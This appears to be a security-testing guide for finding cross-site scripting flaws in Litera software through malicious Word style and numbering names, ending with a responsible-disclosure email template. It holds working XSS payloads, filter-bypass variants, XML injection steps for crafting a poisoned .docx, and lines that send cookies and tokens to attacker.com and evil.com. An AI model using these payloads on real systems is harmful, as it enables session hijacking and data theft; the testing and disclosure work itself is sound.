# XSS Test Guide: Word Document Numbering Styles

## Quick Test Document Creation

### Option A: Use Word (Easiest)

1. **Open Word** → New blank document

2. **Create malicious numbering style:**
   - Home → Multilevel List → Define New List Style
   - Name: `<img src=x onerror="alert('Numbering XSS!')">`
   - Click OK

3. **Create malicious paragraph style:**
   - Home → Styles → Create a Style
   - Name: `<svg/onload=alert('Style XSS')>`
   - Click OK

4. **Apply numbering to some text:**
   - Type a few lines
   - Apply your malicious list style

5. **Save as:** `xss-numbering-test.docx`

---

### Option B: Direct XML Injection (More Payloads)

```bash
# 1. Create a normal Word doc with numbering, save it

# 2. Unzip it
mkdir xss_test && cd xss_test
unzip ../normal.docx

# 3. Edit word/numbering.xml
# Find <w:abstractNum> sections and inject in names
```

**In `word/numbering.xml`, find:**
```xml
<w:abstractNum w:abstractNumId="0">
  <w:nsid w:val="12345678"/>
  <w:multiLevelType w:val="multilevel"/>
```

**Add after `<w:multiLevelType>`:**
```xml
<w:name w:val="&lt;img src=x onerror=&quot;fetch('https://attacker.com/steal?cookie='+document.cookie)&quot;&gt;"/>
```

**Also edit `word/styles.xml`, find heading styles:**
```xml
<w:style w:type="paragraph" w:styleId="Heading1">
  <w:name w:val="&lt;script&gt;alert('XSS')&lt;/script&gt;"/>
```

```bash
# 4. Rezip
zip -r ../xss-numbering-test.docx *
```

---

## Payloads to Test

### Basic Detection (Alert Box)
```
<img src=x onerror="alert('XSS')">
<svg onload="alert('XSS')">
<body onload="alert('XSS')">
```

### Data Exfiltration (Real Attack)
```
<img src=x onerror="fetch('https://evil.com/?d='+document.cookie)">
<img src=x onerror="new Image().src='https://evil.com/?d='+localStorage.getItem('token')">
```

### Encoded Variants (Bypass Filters)
```
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;('XSS')">
<img src=x onerror=alert`XSS`>
<img/src=x onerror=alert('XSS')>
```

### Quote Escaping Tests
```
"><img src=x onerror="alert('double')">
'><img src=x onerror='alert("single")'>
`><img src=x onerror=`alert('backtick')`>
```

---

## Where to Test in Litera

### Numbering-Specific Features

| Feature | How to Test |
|---------|-------------|
| **Numbering Scheme Picker** | Open the doc, go to numbering/list options. Does it show scheme names? |
| **Apply Numbering** | Select text, apply numbering. Any preview showing style names? |
| **Numbering Properties** | Right-click numbered list → Properties. Style names shown? |
| **Numbering Gallery** | Any gallery/library of numbering schemes? |
| **Import/Export Numbering** | Import the malicious doc's numbering to another doc |

### Style-Related Features

| Feature | How to Test |
|---------|-------------|
| **Style Pane** | View → Styles. Does it render the malicious name? |
| **Style Inspector** | Any tool that shows "Current style: X" |
| **Style Comparison** | Compare two docs with different styles |
| **Template Styles** | Save as template, open template manager |

### Document Analysis Features

| Feature | How to Test |
|---------|-------------|
| **Document Review** | Any "analyze document" or "document health" feature |
| **Metadata Viewer** | Tools that show document properties |
| **Compare Documents** | Compare malicious doc with clean doc |
| **Document Conversion** | Convert to PDF, HTML, or other formats |

---

## Testing Checklist

```
□ Created test document with XSS in numbering style name
□ Created test document with XSS in paragraph style name
□ Tested numbering picker/gallery
□ Tested style pane
□ Tested document properties/inspector
□ Tested import numbering from document
□ Tested compare documents feature
□ Tested template management
□ Tested any "analyze" or "report" features
□ Documented which payloads triggered (if any)
```

---

## What Success Looks Like

### Vulnerable (XSS Fires)
- Alert box pops up
- Console shows JavaScript executed
- Network tab shows request to attacker URL

### Partially Vulnerable (HTML Injection)
- Style name renders as formatted text (bold, italic from tags)
- Images load from `src` attribute
- Layout breaks from injected HTML

### Not Vulnerable (Properly Escaped)
- You see literal text: `<img src=x onerror="alert('XSS')">`
- Special characters converted: `&lt;img src=x...&gt;`

---

## Evidence Collection

If vulnerable, capture:

1. **Screenshot** of the alert/injected content
2. **Screen recording** showing reproduction steps
3. **Network tab** showing any exfiltrated data
4. **Console logs** showing JavaScript execution
5. **The test document** (for reproduction)

---

## Responsible Disclosure Template

```
Subject: Security Vulnerability - XSS via Word Document Style Names

Hi Litera Security Team,

I discovered a cross-site scripting (XSS) vulnerability in [Product Name] 
that allows arbitrary JavaScript execution when processing Word documents 
with malicious style names.

**Severity:** High
**Attack Vector:** Malicious Word document
**Impact:** Session hijacking, data theft, malware injection

**Steps to Reproduce:**
1. Create Word document with style named: <img src=x onerror="alert('XSS')">
2. Open document in [Product Name]
3. Navigate to [Feature]
4. Observe JavaScript execution

**Proof of Concept:** [Attached document]

**Suggested Fix:** HTML-encode all style names before rendering in UI.

Please confirm receipt and expected timeline for fix.

Best regards,
[Your name]
```
